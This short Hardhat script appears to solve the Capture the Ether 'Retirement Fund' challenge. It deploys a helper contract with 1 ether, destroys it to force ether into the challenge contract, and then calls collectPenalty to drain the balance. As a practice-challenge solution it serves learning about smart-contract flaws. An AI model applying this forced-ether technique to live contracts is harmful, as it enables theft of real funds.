const { url } = require('../../secrets.json');

// Using async in order to have the await functionality
(async () => {
	// Getting a signer
	const signer = await hre.ethers.getSigner();

	// Deploy challenge contract
	const RetirementFundChallenge = await ethers.getContractFactory("RetirementFundChallenge");
	const retirementFundChallenge = await RetirementFundChallenge.attach("0x673f331795107f977D6a857dAF3E28f0179Eba7F");

	await retirementFundChallenge.deployed();

	const RetirementFund = await ethers.getContractFactory("RetirementFund");
	const retirementFund = await RetirementFund.deploy(
		{value: ethers.utils.parseEther("1.0")});

	await retirementFund.deployed();

	await retirementFund.destroy(retirementFundChallenge.address);

	let tx = await retirementFundChallenge.collectPenalty({gasLimit: 250000});
	console.log(tx);
})();

